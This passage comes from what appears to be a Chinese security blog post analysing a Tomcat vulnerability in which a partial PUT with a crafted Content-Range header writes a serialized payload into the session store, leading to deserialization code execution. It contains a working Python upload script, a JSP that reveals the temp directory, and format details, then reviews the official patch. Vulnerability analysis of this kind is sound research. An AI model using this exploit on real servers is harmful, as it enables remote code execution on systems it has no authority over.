+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">&lt;body&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl">    out.println(request.getServletContext().getAttribute(ServletContext.TEMPDIR));
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span><span class="line"><span class="cl">&lt;/body&gt;
+</span></span><span class="line"><span class="cl">&lt;/html&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>访问拿到路径：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/Users/xxxxxxxx/Library/Caches/JetBrains/IntelliJIdea2024.3/tomcat/c95d0ef3-f2a9-4529-9363-81226b1de81c/work/Catalina/localhost/tomcat9_0_35_Web_exploded
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这一看不就是持久化session存储文件的地方吗，并且其实跟进FileStore的load()方法，其调用的file()方法中的关键调用的directory()方法，其定义了文件存储的路径，跟进如下：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928151302309.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928151302309"
+	
+	
+></p>
+<p>很明显了吧，这里的directory就是通过配置文件设置，不设置也没问题，其次也是通过servletContext.getAttribute(ServletContext.TEMPDIR)来获取的路径，这也是和前面一模一样的。</p>
+<p>再回到DefaultServelt类的executePartialPut()方法，在获取到存储路径之后，对path进行了替换，将<code>/</code>替换为<code>.</code>，比如我通过设置uri为/ser/session，那么这里替换后就是.ser.session，正好也是符合.session文件。</p>
+<p>再继续看，然后应该就是会将请求流中的数据写入到contentFile中了：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928152015195.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928152015195"
+	
+	
+></p>
+<p>最后写入到文件中：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928152051040.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928152051040"
+	
+	
+></p>
+<p>————————</p>
+<p>由此链路清晰，通过控制Content-Range请求头，写入文件到持久化session存储文件的地方，然后直接加载即可，不需要使用<code>../</code>来进行目录穿越。</p>
+<h3 id="攻击复现">攻击复现
+</h3><p>还是反序列化打cc5，使用python脚本上传文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://192.168.153.178:8083/tomcat9_0_35_Web_exploded/ser/session&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">local_file</span> <span class="o">=</span> <span class="s2">&#34;ser.session&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">local_file</span><span class="p">,</span> <span class="s2">&#34;rb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">file_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">file_size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">file_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Content-Range: bytes=0-(size-1)/size</span>
+</span></span><span class="line"><span class="cl"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Content-Range&#34;</span><span class="p">:</span> <span class="sa">f</span><span class="s2">&#34;bytes=0-</span><span class="si">{</span><span class="n">file_size</span><span class="o">-</span><span class="mi">1</span><span class="si">}</span><span class="s2">/</span><span class="si">{</span><span class="n">file_size</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Content-Type&#34;</span><span class="p">:</span> <span class="s2">&#34;application/octet-stream&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">file_data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;状态码:&#34;</span><span class="p">,</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>回显409状态码。</p>
+<p>然后直接打加载即可：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928154007463.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928154007463"
+	
+	
+></p>
+<p>成功调用反序列化。并且再次调试也是符合前面分析的过程的。</p>
+<p>————————</p>
+<p>一些需要注意的地方：</p>
+<p>Conten-Range的基本格式为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">Content-Range: bytes &lt;start&gt;-&lt;end&gt;/&lt;total&gt;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>但是这里需要注意在解析Content-Range的值要符合tomcat中定义的格式：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928170700180.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928170700180"
+	
+	
+></p>
+<p>跟进parse()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928170844694.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928170844694"
+	
+	
+></p>
+<p>要求了格式，故需要使用如下的格式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">Content-Range: bytes=&lt;start&gt;-&lt;end&gt;/&lt;length&gt;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>其次还是要注意目标环境是否有可供打反序列化的类。</p>
+<h3 id="总结">总结
+</h3><p>限制条件更多了，算是两个CVE的结合体，但是还是找到了不同的一条路。重点还是对代码调用的理解以及对代码块功能实现的分析。</p>
+<p><strong>如何修复</strong>？</p>
+<p>当然还是开启readonly，这种配置完全没有必要开着吧。代码层面如何限制呢，在put文件上传时加一个不允许session后缀？抑或是在load()加载文件时不允许加载文件名以<code>.</code>开头。看了一下官方的修复逻辑：</p>
+<p>来到DefaultServlet类的executePartialPut()方法：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928174845268.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928174845268"
+	
+	
+></p>
+<p>算是直接限制死了，这里直接不用你的path了，让你连文件名都摸不到，跟进File.createTempFile()方法（注意这里将suffix设置为了null）：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928175111375.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928175111375"
+	
+	
+></p>
+<p>直接限制文件后缀为<code>.tmp</code>，别想用<code>.session</code>后缀，然后还调用了TempDirectory.generateFile()来随机生成文件名：</p>
+<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250928175407441.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250928175407441"
+	
+	
+></p>
+<p>似乎还在File.createTempFile()中调用checkWrite()方法进行了鉴权。</p>
+<p>而FileStore类的load()方法似乎还没有什么变化。</p>
+<p>这修复方式绝了，学到了，这样外部就不会知道文件名称以及无法控制文件后缀为.session。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/tomcat-put%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8Csession-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Tomcat PUT文件上传和Session 反序列化代码执行漏洞分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/tomcat%E5%85%B3%E9%94%AE%E7%9F%A5%E8%AF%86%E4%BA%86%E8%A7%A3/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Tomcat关键知识了解</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/hibernate%E7%BB%84%E4%BB%B6%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">hibernate组件的反序列化漏洞</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/jdk17%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%B0%84%E7%BB%95%E8%BF%87/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">JDK17下的反射绕过</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/fastjson2%E4%B8%8B%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">fastjson2下的反序列化调用链分析</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2025 Example Person
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
